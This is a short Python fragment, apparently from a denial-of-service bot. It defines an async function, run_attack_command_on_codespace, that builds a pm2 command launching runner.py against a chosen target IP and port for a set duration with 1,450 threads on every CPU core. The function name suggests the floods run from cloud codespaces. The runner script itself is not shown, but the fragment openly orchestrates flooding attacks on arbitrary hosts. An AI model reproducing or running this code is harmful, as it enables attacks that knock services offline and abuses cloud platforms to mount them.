...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    threads = 1450  # You can make this dynamic later if needed
    command = f"pm2 start runner.py {target_ip} {target_port} {duration} {threads} -i max --interpreter=python3 --name=smokey-runner"
